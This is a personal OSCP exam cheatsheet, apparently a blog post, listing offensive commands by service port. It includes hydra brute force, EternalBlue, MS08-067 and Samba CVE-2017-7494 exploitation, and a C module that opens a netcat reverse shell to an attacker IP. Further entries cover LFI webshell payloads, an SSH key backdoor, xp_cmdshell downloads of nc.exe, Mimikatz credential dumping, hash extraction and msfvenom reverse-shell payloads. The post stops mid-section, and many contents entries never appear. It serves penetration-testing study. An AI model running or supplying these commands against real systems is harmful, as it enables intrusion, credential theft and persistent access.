---
layout: post
title: OSCP personal cheatsheet
tags: [OSCP, Cheatsheet]
description: "OSCP personal cheatsheet"
---

- [Enumeration](#enumeration)

- [NMAP](#nmap)
  * [TCP](#tcp)
  * [UDP](#udp)

- [FTP - 21](#ftp---21)

  * [Brute force](#brute-force)
  * [Downloading file](#downloading-file)
  * [Uploading file](#uploading-file)

- [SSH - 22](#ssh---22)
  * [Brute force](#brute-force-1)
  * [CVE-2008-0166](#cve-2008-0166)
  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)

- [DNS - 53](#dns---53)
  * [Zone transfert](#zone-transfert)
  * [DNS brute force](#dns-brute-force)

- [FINGER - 79](#finger---79)
  * [User enumeration](#user-enumeration)
  * [Command execution](#command-execution)

- [HTTP - HTTPS - 80 - 443](#http---https---80---443)
  * [Automatic scanners](#automatic-scanners)
  * [Wordpress](#wordpress)
    + [Wordpress panel RCE](#wordpress-panel-rce)
  * [Drupal](#drupal)
    + [Username enumeration](#username-enumeration)
    + [Hidden pages enumeration](#hidden-pages-enumeration)
    + [Drupal panel RCE](#drupal-panel-rce)
  * [Joomla](#joomla)
  * [Tomcat](#tomcat)
    + [Default credentials](#default-credentials)
    + [Brute force](#brute-force-2)
    + [Tomcat panel RCE](#tomcat-panel-rce)
  * [WebDav](#webdav)
  * [HTTP brute force authentication](#http-brute-force-authentication)
    + [HTTP basic authentication](#http-basic-authentication)
    + [HTTP GET request](#http-get-request)
    + [HTTP POST request](#http-post-request)
  * [Spidering / Brute force directories / files](#spidering--brute-force-directories--files)
    + [File backups](#file-backups)
  * [Local File Inclusion / Remote File Inclusion - LFI / RFI](#local-file-inclusion--remote-file-inclusion---lfi--rfi)
    + [Wrappers](#wrappers)
      - [Wrapper php://filter](#wrapper-phpfilter)
      - [Wrapper expect://](#wrapper-expect)
      - [Wrapper data://](#wrapper-data)
      - [Wrapper input://](#wrapper-input)
    + [Useful LFI list](#useful-lfi-list)
    + [Tools](#tools)
  * [Command injection](#command-injection)
  * [Deserialization](#deserialization)
  * [File upload](#file-upload)
  * [SQL injection](#sql-injection)
  * [XSS](#xss)
  * [Other web vulnerabilities](#other-web-vulnerabilities)
  * [Upload a file with PUT](#upload-a-file-with-put)

- [KERBEROS - 88](#kerberos---88)

- [POP3 - 110](#pop3---110)
  * [Brute force](#brute-force-3)
  * [Read mail](#read-mail)

- [SNMP - 161](#snmp---161)
  * [Brute force community string](#brute-force-community-string)
  * [Modifying SNMP values](#modifying-snmp-values)

- [LDAP - 389](#ldap---389)
  * [Scans](#scans)
  * [Graphical Interface](#graphical-interface)

- [SMB - 445](#smb---445)

  * [Version if nmap didn't detect it](#version-if-nmap-didnt-detect-it)
  * [Scan for vulnerability](#scan-for-vulnerability)
  * [Manual testing](#manual-testing)
  * [Brute force](#brute-force-4)
  * [Mount a SMB share](#mount-a-smb-share)
  * [Get a shell](#get-a-shell)
  * [EternalBlue (MS17-010)](#EternalBlue-MS17-010)
    + [Check if vulnerable](#check-if-vulnerable)
    + [Prepare shellcodes and listeners](#prepare-shellcodes-and-listeners)
    + [Exploit](#exploit)
    * [If this doesn't work, try this one](#if-this-doesnt-work-try-this-one)
  * [MS08-067](#ms08-067)
  * [CVE-2017-7494](#cve-2017-7494)

- [MSSQL - 1433](#mssql---1433)
  * [Get information](#get-information)
  * [Brute force](#brute-force-5)
  * [Having credentials](#having-credentials)
  * [Manual exploit](#manual-exploit)

- [NFS - 2049](#nfs---2049)
  * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
  * [Mount a share](#mount-a-share)
  * [NFS misconfigurations](#nfs-misconfigurations)

- [MYSQL - 3306](#mysql---3306)
  * [Brute force](#brute-force-6)
  * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
  * [Connect](#connect)
  * [MySQL commands](#mysql-commands)
  * [Manual exploit](#manual-exploit-1)

- [RDP - 3389](#rdp---3389)
  * [Brute force](#brute-force)
  * [Connect with known credentials / hash](#connect-with-known-credentials--hash)
  * [Session stealing](#session-stealing)
    + [Get openned sessions](#get-openned-sessions)
    + [Access to the selected](#access-to-the-selected)
  * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group-windows)

- [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
  * [Scans](#scans-1)
  * [Brute force](#brute-force-8)
  * [Connect](#connect-1)
  * [Found VNC password](#found-vnc-password)
    + [Linux](#linux)
    + [Windows](#windows)
  * [Decrypt VNC password](#decrypt-vnc-password)

- [WINRM - 5985 - 5986](#winrm---5985---5986)
  * [Brute force](#brute-force-9)
  * [Connecting](#connecting)

- [CGI](#cgi)

  * [Found CGI scripts](#found-cgi-scripts)

- [Command and control framework](#command-and-control-framework)

- [Compiling exploits](#compiling-exploits)

  * [For linux](#for-linux)
  * [For windows](#for-windows)
  * [Cross compile](#cross-compile)

- [DICTIONARY GENERATION](#dictionary-generation)

- [FILE TRANSFER](#file-transfer)
  * [Linux](#linux-1)
  * [Windows](#windows-1)

- [GIT](#git)
  * [Download .git](#download-git)
  * [Extract .git content](#extract-git-content)

- [HASHES](#hashes)
  * [Windows](#windows-2)
  * [Linux](#linux-2)

- [MIMIKATZ](#mimikatz)

- [MISCELLANEOUS](#miscellaneous)

  * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)

- [MSFVENOM PAYLOAD](#msfvenom-payload)
  * [Linux](#linux-3)
  * [Windows](#windows-3)
  * [PHP](#php)
  * [ASP](#asp)
  * [JSP](#jsp)
  * [WAR](#war)
  * [Python](#python)
  * [Bash](#bash)
  * [Perl](#perl)
  * [Listener](#listener)
    + [Metasploit](#metasploit)
    + [Netcat](#netcat)

- [PASSWORD CRACKING](#password-cracking)
  * [Online](#online)
  * [Hashcat](#hashcat)
    + [Linux password](#linux-password)
    + [Windows password](#windows-password)
    + [Others](#others)
    + [Rules](#rules)
  * [John](#john)

- [PIVOTING](#pivoting)

  * [Sshuttle](#sshuttle)
  * [Proxychains](#proxychains)

- [PRIVILE ESCALATION](#privile-escalation)
  * [Linux](#linux-4)
    + [Enumeration scripts](#enumeration-scripts)
    * [Vulnerability scan](#vulnerability-scan)
    * [Suid checker](#suid-checker)
    * [Methodology to follow](#methodology-to-follow)
  * [Windows](#windows-4)
    + [Enumeration scripts](#enumeration-scripts-1)
      - [General scans](#general-scans)
      - [Search for CVE](#search-for-cve)
      - [Post exploitation](#post-exploitation)
    + [JuicyPotato (SeImpersonate or SeAssignPrimaryToken)](#juicypotato-seimpersonate-or-seassignprimarytoken)
    * [Methodology to follow](#methodology-to-follow-1)
    * [Autorun](#autorun)
      + [Detection](#detection)
      + [Exploitation](#exploitation)
    * [AlwaysInstallElevated](#alwaysinstallelevated)
      + [Detection](#detection-1)
      + [Exploitation](#exploitation-1)
    * [Executable Files](#executable-files)
      + [Detection](#detection-2)
      + [Exploitation](#exploitation-2)
    * [Startup applications](#startup-applications)
      + [Detection](#detection-3)
      + [Exploitation](#exploitation-3)
    * [Weak service permission](#weak-service-permission)
      + [Detection](#detection-4)
      + [Exploitation](#exploitation-4)
    * [Unquoted service paths](#unquoted-service-paths)
      + [Detection](#detection-5)
      + [Exploitation](#exploitation-5)
    * [Hot potato](#hot-potato)
      + [Exploitation](#exploitation-6)
    * [CVE](#cve)
      + [Windows XP](#windows-xp)
      + [Windows 7](#windows-7)
      + [Windows 8](#windows-8)
      + [Windows 10](#windows-10)
      + [Windows Server 2003](#windows-server-2003)

- [PROOFS](#proofs)
  * [Linux](#linux-5)
  * [Windows](#windows-5)

- [REVERSE SHELL](#reverse-shell)

  - [Amazing tool for shell generation](#amazing-tool-for-shell-generation)
  - [Bash](#bash-1)
  - [Perl](#perl-1)
  - [Python](#python-1)
  - [Netcat](#netcat-1)
  - [More reverse shell](#more-reverse-shell)
  - [Interactive shell](#interactive-shell)
  - [Adjust Interactive shell](#adjust-interactive-shell)

- [SHELLSHOCK](#shellshock)

- [USEFUL LINUX COMMANDS](#useful-linux-commands)
  * [Find a file](#find-a-file)
  * [Active connection](#active-connection)
  * [List all SUID files](#list-all-suid-files)
  * [Determine the current version of Linux](#determine-the-current-version-of-linux)
  * [Determine more information about the environment](#determine-more-information-about-the-environment)
  * [List processes running](#list-processes-running)
  * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed-and-forbidden-commands-for-the-invoking-use)

- [USEFUL WINDOWS COMMANDS](#useful-windows-commands)

- [ZIP](#zip)

------

## Enumeration

```
nmap -sn -v <IP>/CIDR
```

```
nmapAutomator <IP> All
```

```
autorecon <IP>/CIDR
```

------

## NMAP

### TCP

```
sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v
```

### UDP

```
sudo -sU -sS -sC -sV -oA <NAME>.udp <IP> -v
```

------

## FTP - 21

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

### Downloading file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

### Uploading file

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```

------

## SSH - 22

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

### CVE-2008-0166

```
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```

### SSH backdoor - post exploitation

```
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```

------

## DNS - 53

```
dnsenum <DOMAIN>
```

```
dnsrecon -d <DOMAIN>
```

### Zone transfert

```
dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com
```

### DNS brute force

```
https://github.com/blark/aiodnsbrute
```

------

## FINGER - 79

### User enumeration

```
finger @<IP>
finger <USER>@<IP>
```

### Command execution

```
finger "|/bin/id@<IP>"
finger "|/bin/ls -a /<IP>"
```

------

## HTTP - HTTPS - 80 - 443

### Automatic scanners

```
nikto -h <URL>
python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
```

### Wordpress

```
# Scan
wpscan --rua -e --url <URL>

# Brute force user(s)
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
```

#### Wordpress panel RCE

```
Modifying a php from the theme used (admin credentials needed)

Appearance -> Editor -> 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<IP>/wp-content/themes/twentytwelve/404.php
```

### Drupal

```
droopescan scan -u <URL>
```

#### Username enumeration

```
In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<number> you can see the number of existing users :
	- /user/1 -> Access denied (user exist)
	- /user/2 -> Page not found (user doesn't exist)
```

#### Hidden pages enumeration

```
Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
```

#### Drupal panel RCE

```
You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
```

### Joomla

```
joomscan -u <URL>
./joomlavs.rb --url <URL> -a -v
```

### Tomcat

#### Default credentials

```
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

#### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```

#### Tomcat panel RCE

```
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <PORT>

# Execute payload
curl http://<IP>:8080/shell/
```

### WebDav

```
davtest -url <URL>
```

### HTTP brute force authentication

#### HTTP basic authentication

```
# Hydra
hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=<URL> user_pass=FILE0 0=<USER:PASSWORD_LIST> -x ignore:code=401 -x ignore:code=307
```

#### HTTP GET request

```
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```

#### HTTP POST request

```
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
```

### Spidering / Brute force directories / files

```
gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>

ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>
dirbuster

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### File backups

Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are

```
file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
```

### Local File Inclusion / Remote File Inclusion - LFI / RFI

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

#### Wrappers

##### Wrapper php://filter

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
```

##### Wrapper expect://

```
http://example.com/index.php?page=expect://id
```

##### Wrapper data://

```
echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
```

##### Wrapper input://

```
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
```

#### Useful LFI list

```
# Linux
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
```

#### Tools

```
kadimus --url <URL>
python lfisuite.py
```

### Command injection

For command injection always use BurpSuite !

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
```

### Deserialization

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
```

### File upload

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
```

### SQL injection

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
```

### XSS

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
<script src="http://<IP>:3000/hook.js"></script>
```

### Other web vulnerabilities

```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

### Upload a file with PUT

```
curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v
```

------

## KERBEROS - 88

```
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
```

------

## POP3 - 110

### Brute force

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

### Read mail

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

------

## SNMP - 161

### Brute force community string

```
onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```

```
snmp-check <IP>
```

### Modifying SNMP values

```
http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
```

------

## LDAP - 389

### Scans

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

### Graphical Interface

```
jxplorer
```

------

## SMB - 445

### Version if nmap didn't detect it

```
Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>
```

### Scan for vulnerability

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

If :

- MS17-010 - [EternalBlue](#EternalBlue (MS17-010))
- MS08-067 - [MS08-067](#MS08-067)
- CVE-2017-7494 - [CVE-2017-7494](#CVE-2017-7494)

### Manual testing

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

### Brute force

```
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```

### Mount a SMB share

```
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```

### Get a shell

```
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```

### EternalBlue (MS17-010)

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

#### Check if vulnerable

```
python eternal_checker.py <IP>
```

#### Prepare shellcodes and listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

#### Exploit

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

May need to run it multiple times
```

#### If this doesn't work, try this one

```
python zzz_exploit.py <IP>
```

### MS08-067

```
# Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp <PORT>

# Exploit
python ms08_067_2018.py <IP> <NUMBER> 445
```

### CVE-2017-7494

```
# Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
```

Create a new file named poc.c :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 <IP>");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start an ICMP listener
sudo tcpdump -i <INTERFACE> icmp

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start a listener
nc -lvp <PORT>

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

------

## MSSQL - 1433

### Get information

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### Having credentials

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
```

------

## NFS - 2049

### Show Mountable NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

### Mount a share

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

### NFS misconfigurations

```
# List exported shares
cat /etc/exports
```

If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.

```
# Attacker, as root user

mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <SHARE>
./pwn # Root shell
```

------

## MYSQL - 3306

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

### Extracting MySQL credentials from files

```
cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Connect

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

### MySQL commands

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
```

------

## RDP - 3389

### Brute force

```
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
```

### Connect with known credentials / hash

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
```

### Session stealing

#### Get openned sessions

```
query user
```

#### Access to the selected

```
tscon <ID> /dest:<SESSIONNAME>
```

### Adding user to RDP group (Windows)

```
net localgroup "Remote Desktop Users" <USER> /add
```

------

## VNC - 5800 - 58001 - 5900 - 5901

### Scans

```
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
```

### Brute force

```
hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
```

### Connect

```
vncviewer <IP>:<PORT>
```

### Found VNC password

#### Linux

```
Default password is stored in: ~/.vnc/passwd
```

#### Windows

```
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

### Decrypt VNC password

```
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
```


------

## Compiling exploits

### For linux

```
# 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c
```

### For windows

```
To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <FILE.exe> <FILE.c>
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <FILE.exe><FILE.c>
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <FILE>.exe <FILE>.cpp
To compile python scripts, pyinstaller --onefile <SCRIPT.py>

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

### Cross compile

```
gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
```

------

## DICTIONARY GENERATION

```
cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
```

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
```


## GIT

### Download .git

```
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
```

### Extract .git content

```
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
```

------

## HASHES

### Windows

```
reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes
```

### Linux

```
unshadow passwd shadow > hashes
```

------

## MIMIKATZ

```
privilege::debug
```

```
sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
```

------

## MISCELLANEOUS

### Get a Windows path without spaces

```
# path.cmd
@echo off
echo %~s1

path.cmd "C:\Program Files (x86)\Common Files\test.txt"
C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
```

------

## MSFVENOM PAYLOAD

### Linux

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### PHP

```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
